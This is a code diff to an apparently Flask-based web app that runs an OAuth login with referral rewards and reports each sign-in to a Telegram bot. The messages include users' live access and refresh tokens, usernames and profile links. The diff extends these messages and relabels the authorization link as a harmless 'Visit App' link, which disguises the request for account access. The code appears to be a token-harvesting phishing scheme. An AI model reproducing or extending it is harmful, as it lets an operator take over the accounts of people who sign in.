@@ -205,7 +205,7 @@ def send_startup_message():
     meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
 
     message = (
-        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
+        f"🚀 *App URL:*\n[Visit App]({authorization_url})\n\n"
         f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -415,24 +415,31 @@ def home():
     if referrer_id:
         session['referrer_id'] = referrer_id
 
-    # Check if user is already logged in
+    # Check if user is already logged in (returning user)
     if 'username' in session:
         username = session['username']
         
-        # Ensure referral URL is generated and stored for returning users
+        # Retrieve or generate the referral URL
         referral_url = session.get('referral_url') or generate_referral_url(username)
         if referral_url:
             session['referral_url'] = referral_url
         else:
             print(f"Failed to generate referral URL for returning user {username}")
 
+        # Retrieve the user's total token balance
+        user_token_balance = get_user_token_balance(username)
+
+        # Notification for returning users, including referral link and token balance
         send_message_via_telegram(
             f"👋 @{username} just returned to the website.\n"
-            f"🌐 Referral Link: {referral_url or 'No referral link available'}"
+            f"🌐 Referral Link: {referral_url or 'No referral link available'}\n"
+            f"💰 Total Tokens: {user_token_balance} (including referral rewards)\n"
+            f"📊 Total Tokens in Database: {get_total_tokens()}"
         )
+
         return redirect(url_for('welcome'))
 
-    # OAuth authorization flow
+    # OAuth authorization flow for new users
     if request.args.get('authorize') == 'true':
         state = "0"
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
@@ -444,7 +451,7 @@ def home():
         )
         return redirect(authorization_url)
 
-    # Handle response after authorization
+    # Handle response after authorization (new user flow)
     if code:
         if error:
             return f"Error during authorization: {error}", 400
@@ -484,28 +491,35 @@ def home():
 
                 # Reward the referrer if a referrer ID is stored in the session and the user wasn't referred
                 if 'referrer_id' in session:
-                    # Check if the user was referred already to prevent self-referrals and duplicate rewards
-                    if not was_user_referred(username):
-                        reward_referrer(session['referrer_id'])
+                    referrer_username = get_username_by_id(session['referrer_id'])  # Assuming this helper function exists
+                    if referrer_username and not was_user_referred(username):
+                        reward_referrer(referrer_username)
                         mark_user_as_referred(username)
+                        referrer_info = f"👤 Referred by: @{referrer_username}"
+                    else:
+                        referrer_info = "👤 No referrer or already rewarded."
                     session.pop('referrer_id', None)
+                else:
+                    referrer_info = "👤 No referrer"
 
                 # Update session data
                 session['username'] = username
                 session['access_token'] = access_token
                 session['refresh_token'] = refresh_token
 
-                # Retrieve total token count for notification
-                total_tokens = get_total_tokens()
+                # Retrieve the user's updated total token balance
+                user_token_balance = get_user_token_balance(username)
 
-                # Notify via Telegram with the referral link included
+                # Notify via Telegram with the referral link included and referrer info
                 send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
                     f"👤 Username: @{username}\n"
                     f"🔗 Profile URL: {profile_url}\n"
                     f"🌐 Referral Link: {referral_url}\n"
-                    f"📊 Total Tokens in Database: {total_tokens}"
+                    f"{referrer_info}\n"
+                    f"💰 Total Tokens: {user_token_balance} (including referral rewards)\n"
+                    f"📊 Total Tokens in Database: {get_total_tokens()}"
                 )
 
                 return redirect(url_for('welcome'))
